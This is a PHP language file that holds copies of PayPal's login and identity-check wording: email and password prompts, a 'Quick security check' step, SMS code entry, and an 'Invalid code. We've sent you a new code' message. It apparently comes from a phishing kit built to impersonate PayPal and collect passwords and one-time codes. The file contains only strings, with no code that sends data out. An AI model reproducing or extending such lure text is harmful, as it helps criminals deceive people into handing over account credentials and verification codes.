<?php

function lang($phrase){
    static $lang = array(
        '1' => 'Log in to your PayPal account',
        '2' => 'Email or mobile number',
        '3' => 'Password',
        '4' => 'Forgot password?',
        '5' => 'Log In',
        '6' => 'or',
        '7' => 'Sign Up',
        '8' => 'English',
        '9' => 'Français',
        '10' => 'Español',
        '11' => '文',
        '12' => 'Quick security check',
        '13' => 'We just need some additional info to confirm it\'s you.',
        '14' => 'Receive a text',
        '15' => 'By continuing, you confirm that you are authorized to use this phone number and agree to receive text messages to confirm your identity in this session. Carrier fees may apply. We may receive subscriber and device details from your wireless operator to use for risk and fraud purposes.',
        '16' => 'Next',
        '17' => 'Type in your code',
        '18' => 'Resend',
        '19' => 'Continue',
        '20' => 'Contact Us',
        '21' => 'Privacy',
        '22' => 'Legal',
        '23' => 'Policy Updates',
        '24' => 'Worldwide',
        '25' => 'Invalid code. We\'ve sent you a new code.',
    );

    return $lang[$phrase];
}
?>
